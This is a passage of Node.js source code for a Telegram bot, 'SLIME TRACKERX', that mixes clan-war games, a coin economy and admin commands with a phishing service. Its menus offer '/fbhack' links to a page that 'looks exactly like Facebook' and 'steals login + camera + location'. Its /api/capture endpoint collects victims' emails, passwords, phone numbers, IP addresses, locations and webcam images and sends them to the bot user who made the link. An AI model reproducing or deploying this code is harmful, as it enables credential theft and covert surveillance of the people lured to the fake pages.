    await saveWar(activeWar.id, activeWar);
    warsCache.delete(activeWar.id);
    
    let winnerClan = clansCache.get(winner);
    let loserClan = clansCache.get(loser);
    
    if (winnerClan) {
      winnerClan.coins += pot;
      winnerClan.wars.wins++;
      winnerClan.xp += 500;
      await saveClan(winner, winnerClan);
    }
    if (loserClan) {
      loserClan.wars.losses++;
      await saveClan(loser, loserClan);
    }
    
    await ctx.telegram.sendMessage(winnerClan.leaderId, `🏆 **WAR VICTORY!** 🏆\n\n${winner} defeated ${loser}!\n💰 Won ${pot} coins!\n✨ +500 clan XP!`);
    await ctx.telegram.sendMessage(loserClan.leaderId, `💀 **WAR LOSS!** 💀\n\n${loser} lost to ${winner}!\n💰 Lost ${activeWar.bet} coins!`);
  }
});

bot.command("clan warstats", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendDopeMessage(ctx, "❌ You're not in a clan!");
  
  let clan = clansCache.get(user.clan);
  if (!clan) return sendDopeMessage(ctx, "❌ Clan not found!");
  
  await sendDopeMessage(ctx,
    `⚔️ **${clan.name} WAR STATS** ⚔️\n\n` +
    `🏆 Wins: ${clan.wars.wins}\n` +
    `💀 Losses: ${clan.wars.losses}\n` +
    `📊 Win Rate: ${clan.wars.wins + clan.wars.losses > 0 ? Math.round((clan.wars.wins / (clan.wars.wins + clan.wars.losses)) * 100) : 0}%\n` +
    `💰 Clan Bank: ${clan.coins} coins`);
});

// ========== 👑 ADMIN COMMANDS ==========
function isOwner(userId) { return userId === OWNER_ID; }

bot.command("admin", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  await sendDopeMessage(ctx, 
    `👑 **OWNER PANEL** 👑\n\n` +
    `📊 /stats - Bot statistics\n` +
    `👥 /users - Total users\n` +
    `💰 /addcoin @user amount\n` +
    `🎫 /gencode coins diamonds uses hours\n` +
    `📢 /broadcast message\n` +
    `🚫 /banuser @user\n` +
    `✅ /unban @user\n` +
    `🎁 /giveall amount\n` +
    `👑 /setadmin @user\n` +
    `🌐 /allwebsites - View all user websites\n` +
    `📘 /fbhackstats - Facebook hack stats\n` +
    `⚔️ /endwar - End all active wars`);
});

bot.command("stats", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let totalCoins = 0, totalHacks = 0, totalFBHacks = 0, totalWordWins = 0;
  for (let u of usersCache.values()) {
    totalCoins += u.coins;
    totalHacks += u.hacks || 0;
    totalFBHacks += u.facebookHacks || 0;
    totalWordWins += u.wordWins || 0;
  }
  let totalWebsites = await Website.countDocuments();
  await sendDopeMessage(ctx, 
    `📊 **STATISTICS**\n\n` +
    `👥 Users: ${usersCache.size}\n` +
    `💰 Total Coins: ${totalCoins}\n` +
    `💀 Total Hacks: ${totalHacks}\n` +
    `📘 Total FB Hacks: ${totalFBHacks}\n` +
    `📝 Total Word Wins: ${totalWordWins}\n` +
    `🌐 Websites: ${totalWebsites}\n` +
    `🏰 Clans: ${clansCache.size}\n` +
    `⚔️ Active Wars: ${warsCache.size}`);
});

bot.command("users", async (ctx) => { 
  if (!isOwner(ctx.from.id)) return; 
  await sendDopeMessage(ctx, `👥 Total Users: ${usersCache.size}`); 
});

bot.command("addcoin", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  let amt = parseInt(args[2]);
  if (!user || isNaN(amt)) return sendDopeMessage(ctx, "Usage: /addcoin @username amount");
  for (let [id, u] of usersCache) {
    try { 
      let c = await ctx.telegram.getChat(id); 
      if (c.username === user) { 
        u.coins += amt; 
        await saveUser(id, u); 
        await sendDopeMessage(ctx, `✅ +${amt} coins to @${user}\n💰 New balance: ${u.coins}`); 
        await bot.telegram.sendMessage(id, `👑 Owner gave you +${amt} coins!`); 
        return; 
      } 
    } catch(e) {}
  }
  sendDopeMessage(ctx, "❌ User not found");
});

bot.command("gencode", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let coins = parseInt(args[1]) || 50;
  let diamonds = parseInt(args[2]) || 0;
  let uses = parseInt(args[3]) || 20;
  let hours = parseInt(args[4]) || 24;
  let code = await genCode(coins, diamonds, uses, hours);
  await sendDopeMessage(ctx, `✅ **CODE GENERATED**\n\n\`${code}\`\n💰 ${coins} coins\n💎 ${diamonds} diamonds\n🎫 ${uses} uses\n⏰ ${hours} hours\n\nUse: /redeem ${code}`);
});

bot.command("broadcast", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return sendDopeMessage(ctx, "Usage: /broadcast message");
  let sent = 0, failed = 0;
  for (let [id] of usersCache) {
    try { 
      await ctx.telegram.sendMessage(id, `📢 **ANNOUNCEMENT**\n\n${msg}`); 
      sent++; 
    } catch(e) { failed++; }
    await new Promise(r => setTimeout(r, 50));
  }
  await sendDopeMessage(ctx, `✅ Sent to ${sent} users\n❌ Failed: ${failed}`);
});

bot.command("banuser", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return sendDopeMessage(ctx, "Usage: /banuser @username");
  for (let [id] of usersCache) {
    try { 
      let c = await ctx.telegram.getChat(id); 
      if (c.username === user) { 
        bannedUsers.add(id); 
        await sendDopeMessage(ctx, `🚫 Banned @${user}`); 
        await bot.telegram.sendMessage(id, "🚫 You have been banned!"); 
        return; 
      } 
    } catch(e) {}
  }
  sendDopeMessage(ctx, "❌ User not found");
});

bot.command("unban", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return sendDopeMessage(ctx, "Usage: /unban @username");
  for (let [id] of usersCache) {
    try { 
      let c = await ctx.telegram.getChat(id); 
      if (c.username === user) { 
        bannedUsers.delete(id); 
        await sendDopeMessage(ctx, `✅ Unbanned @${user}`); 
        await bot.telegram.sendMessage(id, "✅ You have been unbanned!"); 
        return; 
      } 
    } catch(e) {}
  }
  sendDopeMessage(ctx, "❌ User not found");
});

bot.command("giveall", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let amount = parseInt(args[1]);
  if (isNaN(amount)) return sendDopeMessage(ctx, "Usage: /giveall amount");
  let count = 0;
  for (let [id, u] of usersCache) { 
    u.coins += amount; 
    await saveUser(id, u); 
    count++; 
  }
  await sendDopeMessage(ctx, `✅ Added ${amount} coins to ${count} users`);
});

bot.command("setadmin", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return sendDopeMessage(ctx, "Usage: /setadmin @username");
  for (let [id, u] of usersCache) {
    try { 
      let c = await ctx.telegram.getChat(id); 
      if (c.username === user) { 
        u.isAdmin = true; 
        await saveUser(id, u); 
        await sendDopeMessage(ctx, `✅ @${user} is now admin!`); 
        await bot.telegram.sendMessage(id, "👑 You are now an admin!"); 
        return; 
      } 
    } catch(e) {}
  }
  sendDopeMessage(ctx, "❌ User not found");
});

bot.command("allwebsites", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let websites = await Website.find({}).sort({ createdAt: -1 }).limit(50);
  if (websites.length === 0) return sendDopeMessage(ctx, "📭 No websites found!");
  let message = "🌐 **ALL USER WEBSITES** 🌐\n\n";
  for (let site of websites) {
    let owner = await getUsername(site.ownerId);
    message += `📌 ${site.name}\n👤 @${owner}\n📅 ${site.createdAt.toLocaleDateString()}\n\n`;
  }
  await sendDopeMessage(ctx, message);
});

bot.command("fbhackstats", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let total = 0;
  for (let u of usersCache.values()) total += u.facebookHacks || 0;
  await sendDopeMessage(ctx, `📘 **FACEBOOK HACK STATS**\n\n👥 Users with FB hacks: ${Array.from(usersCache.values()).filter(u => (u.facebookHacks || 0) > 0).length}\n📘 Total FB hacks: ${total}`);
});

bot.command("endwar", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let count = 0;
  for (let [id, war] of warsCache) {
    if (war.status === "active") {
      war.status = "completed";
      await saveWar(id, war);
      count++;
    }
    warsCache.delete(id);
  }
  await sendDopeMessage(ctx, `✅ Ended ${count} active wars`);
});

// ========== 🎛️ BUTTON HANDLERS ==========
bot.action("menu_profile", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `👤 **PROFILE**\n\n/setname [name]\n/setbio [text]\n/setlocation [city]\n/setcolor [color]\n/setavatar (reply to photo)\n/profile [@user]\n/followers\n/following\n/post [caption]\n/myposts`); });
bot.action("menu_clan", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `🏰 **CLAN SYSTEM**\n\n/clan create [name] (${CLAN_COST} coins)\n/clan join [name]\n/clan leave\n/clan info\n/clan members\n/clan donate [amount]\n/clan leaderboard\n/clan war [clan] [bet]\n/clan fight\n/clan warstats`); });
bot.action("menu_hack", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `💀 **HACK**\n\n/hack [label]\n/mylinks\n💰 Cost: ${TRACK_COST} coins\n⏰ Links expire in 1 HOUR!`); });
bot.action("menu_fbhack", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `📘 **FACEBOOK HACK**\n\n/fbhack [label]\n💰 Cost: ${TRACK_COST} coins\n🎯 Looks exactly like Facebook!\n📸 Steals login + camera + location`); });
bot.action("menu_word", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `📝 **WORD BATTLE**\n\n/wordbattle @user amount difficulty\n💰 Winner takes ALL!\n/topwords - Word battle leaderboard`); });
bot.action("menu_web", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `🌐 **WEB CREATOR**\n\n/createweb portfolio\n/createweb business\n/createweb store\n/mywebsites\n💰 Cost: ${WEB_PRICE} coins`); });
bot.action("menu_casino", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `🎰 **CASINO**\n\n/dice [amount]\n/slots [amount]\n🎲 Try your luck!`); });
bot.action("menu_chat", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `💬 **CHAT**\n\n/msg @user [message]\n/inbox\n/block @user`); });
bot.action("menu_eco", async (ctx) => { await ctx.answerCbQuery(); let u = await initUser(ctx.from.id); await sendDopeMessage(ctx, `💰 **ECONOMY**\n\nBalance: ${u.coins} coins\n/daily (${DAILY_REWARD} coins)\n/work (${WORK_REWARD} coins)\n/gift @user amount\n/duel @user amount`); });
bot.action("menu_leaderboard", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `🏆 **LEADERBOARDS**\n\n/leaderboard - Top richest\n/topwords - Top word warriors\n/clan leaderboard - Top clans`); });
bot.action("menu_redeem", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `🎁 **REDEEM**\n\n/redeem CODE`); });
bot.action("menu_ref", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `🔗 **REFERRAL**\n\n${refLink(ctx.from.id)}\n\n+${REF_REWARD} coins per referral!`); });
bot.action("menu_admin", async (ctx) => { 
  let user = await initUser(ctx.from.id); 
  if (!user.isAdmin && ctx.from.id !== OWNER_ID) { 
    await ctx.answerCbQuery("❌ Admin only!"); 
    return; 
  } 
  await ctx.answerCbQuery(); 
  await sendDopeMessage(ctx, `👑 **ADMIN PANEL**\n\n/addcoin\n/gencode\n/broadcast\n/users\n/stats\n/banuser\n/unban\n/giveall\n/setadmin\n/allwebsites\n/fbhackstats\n/endwar`); 
});

// ========== 🌐 API ENDPOINTS ==========
app.post("/api/capture", async (req, res) => {
  try {
    let { image, token, ip, location, number, country, code, userAgent, email, password } = req.body;
    if (!token) return res.status(400).json({ error: "No token" });
    
    let data = hackTokens.get(token);
    let isFacebook = false;
    
    if (!data) {
      data = facebookTokens.get(token);
      isFacebook = true;
    }
    
    if (!data) return res.status(404).json({ error: "Link expired or invalid" });
    if (Date.now() > data.expiresAt) {
      hackTokens.delete(token);
      facebookTokens.delete(token);
      return res.status(410).json({ error: "Link has expired" });
    }
    
    let message = `💀 **${isFacebook ? 'FACEBOOK' : 'PHISHING'} SUCCESSFUL** 💀\n\n` +
      `🎯 Label: ${data.label || "No label"}\n` +
      `👤 Hacker: @${data.username}\n` +
      `🕐 Time: ${new Date().toLocaleString()}\n` +
      `📱 IP: ${ip || "Unknown"}\n` +
      `📍 Location: ${location || "Unknown"}\n` +
      (email ? `📧 Email: ${email}\n` : '') +
      (password ? `🔑 Password: ${password}\n` : '') +
      (number ? `📞 Number: ${number}\n` : '') +
      `✨ +20 XP EARNED!`;
    
    if (image && image.length > 100) {
      try { 
        await bot.telegram.sendPhoto(data.userId, { source: Buffer.from(image.split(',')[1], 'base64') }, { caption: message }); 
      } catch(e) { 
        await bot.telegram.sendMessage(data.userId, message); 
      }
    } else { 
      await bot.telegram.sendMessage(data.userId, message); 
    }
    
    await addXP(data.userId, 20);
    
    if (isFacebook) {
      let user = usersCache.get(data.userId);
      if (user) {
        user.facebookHacks = (user.facebookHacks || 0) + 1;
        await saveUser(data.userId, user);
      }
      facebookTokens.delete(token);
    } else {
      hackTokens.delete(token);
    }
    
    res.json({ status: "success", message: "Captured successfully" });
  } catch(e) { 
    console.error("Capture error:", e); 
    res.status(500).json({ error: "Internal error" }); 
  }
});

app.get("/api/check/:token", (req, res) => {
  let token = req.params.token;
  let data = hackTokens.get(token) || facebookTokens.get(token);
  if (!data) return res.json({ valid: false, reason: "Link not found" });
  if (Date.now() > data.expiresAt) return res.json({ valid: false, reason: "Link expired" });
  res.json({ valid: true, expiresIn: `${Math.floor((data.expiresAt - Date.now()) / 60000)} minutes`, label: data.label });
});

app.post("/api/upload", upload.single("image"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No file" });
  res.json({ url: `${DOMAIN}/uploads/${req.file.filename}` });
});

app.get("/facebook.html", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "facebook.html"));
});

app.get("/", (req, res) => { 
  res.sendFile(path.join(__dirname, "public", "index.html")); 
});

// ========== 🚀 KEEP-ALIVE ==========
setInterval(() => {
  axios.get(`${DOMAIN}/`).catch(() => {});
  console.log("💓 Keep-alive ping sent");
}, 4 * 60 * 1000);

// ========== 🚀 START SERVER ==========
const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));

process.on('SIGTERM', () => {
  console.log('SIGTERM received, closing server...');
  server.close(() => {
    bot.stop('SIGTERM');
    mongoose.connection.close();
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('SIGINT received, closing server...');
  server.close(() => {
    bot.stop('SIGINT');
    mongoose.connection.close();
    process.exit(0);
  });
});

async function startBot() {
  try {
    if (process.env.NODE_ENV === 'production' || DOMAIN.includes('render.com')) {
      await bot.telegram.deleteWebhook();
      await bot.telegram.setWebhook(`${DOMAIN}/webhook`);
      console.log(`✅ Webhook set to ${DOMAIN}/webhook`);
      app.post('/webhook', (req, res) => {
        bot.handleUpdate(req.body, res);
      });
    } else {
      await bot.launch();
      console.log(`✅ Bot started with polling`);
    }
  } catch (err) {
    console.error('Failed to start bot:', err);
    await bot.launch();
    console.log(`✅ Bot started with polling (fallback)`);
  }
}

loadData().then(async () => {
  await startBot();
  console.log(`🤖 SLIME TRACKERX v76.0 LIVE!`);
  console.log(`✅ 7000+ WORDS FOR WORD BATTLE`);
  console.log(`✅ CLAN WARS ACTIVE`);
  console.log(`✅ SOCIAL PROFILES ACTIVE`);
  console.log(`✅ FORCE JOIN ACTIVE`);
  console.log(`✅ KEEP-ALIVE ACTIVE`);
}).catch(err => {
  console.error("Failed to load data:", err);
  startBot();
});
